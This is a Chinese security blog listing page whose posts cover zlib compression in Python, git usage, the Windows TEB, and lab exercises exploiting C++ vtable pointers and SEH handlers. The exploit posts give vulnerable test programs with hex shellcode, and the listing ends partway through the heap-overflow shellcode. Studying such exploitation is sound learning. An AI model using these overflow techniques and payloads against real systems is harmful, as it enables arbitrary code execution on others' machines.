<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />






  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="Try your best!">
<meta property="og:type" content="website">
<meta property="og:title" content="上善若水">
<meta property="og:url" content="http://yoursite.com/page/12/index.html">
<meta property="og:site_name" content="上善若水">
<meta property="og:description" content="Try your best!">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="上善若水">
<meta name="twitter:description" content="Try your best!">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.2',
    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":false,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/12/"/>





  <title>上善若水 - 古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">上善若水</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/02/python用模块zlib压缩与解压字符串和文件的方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/02/python用模块zlib压缩与解压字符串和文件的方法/" itemprop="url">python用模块zlib压缩与解压字符串和文件的方法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-02T17:20:22+08:00">
                2017-07-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/misc/" itemprop="url" rel="index">
                    <span itemprop="name">misc</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>python中zlib模块是用来压缩或者解压缩数据，以便保存和传输。它是其他压缩工具的基础。下面来一起看看python用模块zlib压缩与解压字符串和文件的方法。话不多说，直接来看示例代码。</p>
<h3 id="1-压缩与解压字符串"><a href="#1-压缩与解压字符串" class="headerlink" title="1. 压缩与解压字符串"></a>1. 压缩与解压字符串</h3><pre><code>
import zlib
message = 'abcd1234'
compressed = zlib.compress(message)
decompressed = zlib.decompress(compressed)

print 'original:', repr(message)
print 'compressed:', repr(compressed)
print 'decompressed:', repr(decompressed)
</code></pre>

<p><b>结果</b></p>
<pre><code>
original: 'abcd1234'
compressed: 'x\x9cKLJN1426\x01\x00\x0b\xf8\x02U'
decompressed: 'abcd1234'
</code></pre>

<h3 id="2-压缩与解压文件"><a href="#2-压缩与解压文件" class="headerlink" title="2. 压缩与解压文件"></a>2. 压缩与解压文件</h3><pre><code>
import zlib
def compress(infile, dst, level=9):
    infile = open(infile, 'rb')
    dst = open(dst, 'wb')
    compress = zlib.compressobj(level)
    data = infile.read(1024)
    while data:
        dst.write(compress.compress(data))
        data = infile.read(1024)
    dst.write(compress.flush())

def decompress(infile, dst):
    infile = open(infile, 'rb')
    dst = open(dst, 'wb')
    decompress = zlib.decompressobj()
    data = infile.read(1024)
    while data:
        dst.write(decompress.decompress(data))
        data = infile.read(1024)
    dst.write(decompress.flush())

if __name__ == "__main__":
    compress('in.txt', 'out.txt')
    decompress('out.txt', 'out_decompress.txt')
</code></pre>

<h3 id="3-问题——处理对象过大异常"><a href="#3-问题——处理对象过大异常" class="headerlink" title="3. 问题——处理对象过大异常"></a>3. 问题——处理对象过大异常</h3><pre><code>
>>> import zlib
>>> a = '123'
>>> b = zlib.compress(a)
>>> b
'x\x9c342\x06\x00\x01-\x00\x97'
>>> a = 'a' * 1024 * 1024 * 1024 * 10
>>> b = zlib.compress(a)
Traceback (most recent call last):
 File "&lt;stdin&gt;", line 1, in &lt;module&gt;
OverflowError: size does not fit in an int
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/01/攻击C-的虚函数/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/01/攻击C-的虚函数/" itemprop="url">攻击C++的虚函数</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-01T18:23:16+08:00">
                2017-07-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="C-简介"><a href="#C-简介" class="headerlink" title="C++简介"></a>C++简介</h3><p><b>理解虚函数和虚表</b></p>
<ol>
<li>C++类的成员函数声明时，若使用关键字virtual进行修饰，则被称为虚函数</li>
<li>一个类中可能有多个虚函数</li>
<li>虚函数的入口地址统一保存在虚表(Vtable)之中</li>
<li><p>对象在使用虚函数时，首先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用</p>
</li>
<li><font color="#f00">虚表指针保存在对象的内存空间中，紧接着虚表指针的是其他成员变量</font>
</li>
<li><p>虚函数只有通过对象指针的引用才能显示其动态调用的特性。</p>
</li>
</ol>
<h3 id="C-虚函数的利用"><a href="#C-虚函数的利用" class="headerlink" title="C++虚函数的利用"></a>C++虚函数的利用</h3><p>实验代码：</p>
<pre><code>
#include "windows.h"
#include "iostream.h"

char shellcode[] =
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x50\xAE\x42\x00";        // set fake virtual function pointer

class Failwest
{
public:
    char buf[200];
    virtual void test(void)
    {
        cout&lt;&lt;"Class Vtable::test()"&lt;&lt;endl;
    };
};

Failwest overflow, *p;

void main(void)
{
    char *p_vtable;
    p_vtable = overflow.buf - 4;        //point to virtual table
    // reset fake virtual table to 0x004088cc
    // the address mat need to ajusted via runtime debug
    __asm int 3;
    p_vtable[0] = 0x00;
    p_vtable[1] = 0xAF;
    p_vtable[2] = 0x42;
    p_vtable[3] = 0x00;
    strcpy(overflow.buf, shellcode);    // set fake virtual function pointer
    p = &overflow;
    p->test();
}
</code></pre>

<p>C++虚函数利用原理图：<br><img src="/images/2017-07-01/vtable.jpg" alt="C++虚函数利用原理图"></p>
<p>首先需要知道的是：</p>
<ul>
<li>idata: 明显是一个Imports函数的代码段，这里集中所有外部函数地址，代码中会先跳到该地址后再执行，PE文件加载器在开始会获取真实的函数地址来修补idata段中的函数地址。</li>
<li>data: 这个段存放程序的全局数据、全局常量等。</li>
<li>rdata: 名字上看就是资源数据段，程序用到什么资源数据都在这里，资源包括你自己封包的，也包括开发工具自动封包的。</li>
</ul>
<p>所以我们应该在data段中找到自己需要的实验的全局变量</p>
<font color="#f00">局部变量在栈中</font>


<p>得到shellcode起始地址：0x0042AE50<br>shellcode结束地址：0x0042AF00</p>
<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p><img src="/images/2017-07-01/result1.jpg" alt="实验结果"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/30/TEB简介/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/30/TEB简介/" itemprop="url">TEB简介</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-30T21:16:57+08:00">
                2017-06-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="TEB特点"><a href="#TEB特点" class="headerlink" title="TEB特点"></a>TEB特点</h3><ol>
<li>一个进程可能同时有多个线程</li>
<li>每个线程都有一个线程环境块TEB</li>
<li>第一个TEB开始于0x7FFDE000</li>
<li>之后新建的线程的TEB将紧随前边的TEB，之间相隔0x100字节，并向内存地址方向</li>
<li>线程退出时，对应的TEB也被销毁，腾出的TEB空间被新建的线程重复使用。</li>
</ol>
<p>线程环境块的预测图：<br><img src="/images/2017-06-30/TEB_prediction.jpg" alt="线程环境块的预测图"></p>
<h3 id="TEB结构"><a href="#TEB结构" class="headerlink" title="TEB结构"></a>TEB结构</h3><p>由于TEB才是初学，对里面的很多结构都不怎么了解，写这一节主要是为了贴一张图，方便以后补充！</p>
<p><img src="/images/2017-06-30/TEB.jpg" alt="TEB"></p>
<p>当然为了充实被本篇博客，笔者提供几个小程序：</p>
<p><br></p>
<font color="#0f0">从FS寄存器获取当前线程</font>

<pre><code>
int GetThreadId()
{
    int ithread = 0;
    _asm{
        xor esi , esi
        mov eax, fs:[esi+18h]     
        mov ecx, [eax+ 20h] 
        mov eax, [eax+ 24h]
        mov dword ptr[ithread], eax
    }
    return ithread;
}

</code></pre>

<p><br></p>
<font color="#0f0">从FS寄存器获取当前进程ID</font>

<pre><code>
int GetProcessId()
{
    int iProcess = 0;
    _asm{
        xor esi , esi
        mov eax, fs:[esi+18h]
        mov ecx, [eax+ 20h]
        mov eax, [eax+ 24h]
        mov dword ptr[iProcess ], ecx
    }
    return iProcess;
}

</code></pre>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/30/使用git在github上创建新工程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/30/使用git在github上创建新工程/" itemprop="url">使用git在github上创建新工程</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-30T14:29:17+08:00">
                2017-06-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/tool/" itemprop="url" rel="index">
                    <span itemprop="name">tool</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这段时间进经常会忘记如何在github上同步工程，于是又得查资料，查参考书，浪费了很长时间，因此有了感触，写几篇有关此类问题的篇章！</p>
<font color="#f00">这是老手新手都十分容易犯的错误，就是在创建一个新github项目或者以本地已有项目为原型重新创建一个github项目时，容易创建一个空文件夹就直接关联远程仓库，这样做只会返回错误！！！所以，文件夹一定不能为空......</font>

<h3 id="创建新工程需要的命令"><a href="#创建新工程需要的命令" class="headerlink" title="创建新工程需要的命令"></a>创建新工程需要的命令</h3><h4 id="完成本地项目与git的关联"><a href="#完成本地项目与git的关联" class="headerlink" title="完成本地项目与git的关联"></a>完成本地项目与git的关联</h4><pre><code>
cd 工程目录
git init    //初始化本地仓库，当前目录下会出现一个名为 .git 的目录
git add .    //将所有文件添加到缓存区，告诉 Git 开始对这些文件进行跟踪
git commit -am "Hello"    //提交文件到本地仓库

</code></pre>

<h4 id="完成远程项目的创建"><a href="#完成远程项目的创建" class="headerlink" title="完成远程项目的创建"></a>完成远程项目的创建</h4><p>在github上创建某个项目，然后可以拷贝处该项目的地址</p>
<h4 id="关联远程仓库（github上创建的地址）"><a href="#关联远程仓库（github上创建的地址）" class="headerlink" title="关联远程仓库（github上创建的地址）"></a>关联远程仓库（github上创建的地址）</h4><pre><code>
git remote add origin https://github.com/Introspelliam/Hello.git    //关联远程仓库

</code></pre>

<h4 id="push本地项目到远程仓库"><a href="#push本地项目到远程仓库" class="headerlink" title="push本地项目到远程仓库"></a>push本地项目到远程仓库</h4><pre><code>
git push origin master     //push项目到master
Username for 'https://github.com': //你的github账户名称

</code></pre>


<h3 id="github上提供的工程创建方法"><a href="#github上提供的工程创建方法" class="headerlink" title="github上提供的工程创建方法"></a>github上提供的工程创建方法</h3><p><b>…or create a new repository on the command line</b></p>
<pre><code>echo &quot;# ctf-challenges&quot; &gt;&gt; README.md
git init
git add README.md
git commit -m &quot;first commit&quot;
git remote add origin https://github.com/Introspelliam/ctf-challenges.git
git push -u origin master
</code></pre><p><b>…or push an existing repository from the command line</b></p>
<pre><code>git remote add origin https://github.com/Introspelliam/ctf-challenges.git
git push -u origin master
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/29/windows-异常处理中的漏洞利用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/29/windows-异常处理中的漏洞利用/" itemprop="url">windows 异常处理中的漏洞利用</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-29T20:21:31+08:00">
                2017-06-29
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-S-E-H概述"><a href="#1-S-E-H概述" class="headerlink" title="1. S.E.H概述"></a>1. S.E.H概述</h3><p>SEH即异常处理结构体(Structure Exception Handler)，其中包含两个DWORD指针：SEH链表指针和异常处理函数句柄。</p>
<p>几个要点：</p>
<ol>
<li>SEH结构体放在系统栈中</li>
<li>当线程初始化时，会自动向栈中安装一个SEH，作为线程默认的异常处理</li>
<li>如果程序源代码中使用<strong>try{}</strong>except{}或者Assert宏等异常处理机制，编译器将最终将通过向当前函数栈帧中安装一个SEH来实现异常处理</li>
<li>栈中一般会同时存在多个SEH</li>
<li>栈中的多个SEH通过链表指针在栈内由栈顶向栈底串成单项链表，位于链表最顶端的SEH通过TEB(线程环境块)0字节偏移处的指针标识</li>
<li>当异常发生时，操作系统会中断程序，并首先从TEB的0字节偏移处取出距离栈顶最近的SEH，使用异常处理函数句柄所指向的代码来处理异常。</li>
<li>当离“事故现场”最近的异常处理函数运行失效时，将顺着SEH链表依次尝试其他的异常处理函数</li>
<li>如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通过这个函数弹出一个对话框，然后强制关闭程序。</li>
</ol>
<p><img src="/images/2017-06-28/seh.jpg" alt="SEH原理图"></p>
<p>利用SEH的原理：</p>
<ol>
<li>SEH放在栈内，可以缓冲区淹没SEH</li>
<li>精心制造溢出数据可以把SEH中异常处理函数的入口地址更改为shellcode的起始地址</li>
<li>溢出后错误的栈帧或堆块数据往往会触发异常</li>
<li>在Windows开始处理溢出的异常时，会错误地把shellcode当作异常处理函数而执行</li>
</ol>
<h3 id="2-栈溢出中利用SEH"><a href="#2-栈溢出中利用SEH" class="headerlink" title="2. 栈溢出中利用SEH"></a>2. 栈溢出中利用SEH</h3><h4 id="2-1-获取shellcode起始地址和SEH地址"><a href="#2-1-获取shellcode起始地址和SEH地址" class="headerlink" title="2.1 获取shellcode起始地址和SEH地址"></a>2.1 获取shellcode起始地址和SEH地址</h4><p>测试代码</p>
<pre><code>
#include <windows.h>
#include <stdio.h>

char shellcode[] = "\x90\x90\x90\x90";


DWORD MyExceptionhandler(void)
{
    printf("got an exception,  press Enter to kill process!\n");
    getchar();
    ExitProcess(1);
    return 1;
}

void test(char *input)
{
    char buf[200];
    int zero = 0;
    __asm int 3;        // used to break process for debug
    __try
    {
        strcpy(buf, input);  // overrun the stack
        zero = 4/zero;        // generate an exception
    }
    __except(MyExceptionhandler()){}
}

void main()
{
    test(shellcode);
}
</stdio.h></windows.h></code></pre>

<p><b>根据Ollydbg得到结论</b></p>
<font color="#f00">shellcode起始位置为0x0012FE48<br>离栈顶栈顶最近的SEH链表指针地址为0x0012FF18，其异常处理函数句柄地址为0x0012FF1C<br>shellcode起始地址与异常处理句柄地址之间共有212个字节间隙，也就是说，超出缓冲区8字节后的部分将覆盖SEH链的第一个SEH：由于SEH链表指针为0x90909090，所以为无效地址，系统为默认其为最终的异常处理；而而处理函数句柄内的地址是shellcode起始地址，那么就会跳转至此进行函数执行。</font>

<h4 id="2-2-编写shellcode"><a href="#2-2-编写shellcode" class="headerlink" title="2.2 编写shellcode"></a>2.2 编写shellcode</h4><pre><code>
char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x48\xFE\x12\x00";

</code></pre>

<p>注意在执行的时候去掉__asm int 3调试</p>
<h3 id="3-堆溢出中利用SEH"><a href="#3-堆溢出中利用SEH" class="headerlink" title="3. 堆溢出中利用SEH"></a>3. 堆溢出中利用SEH</h3><pre><code>
#include &lt;windows.h&gt;

char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
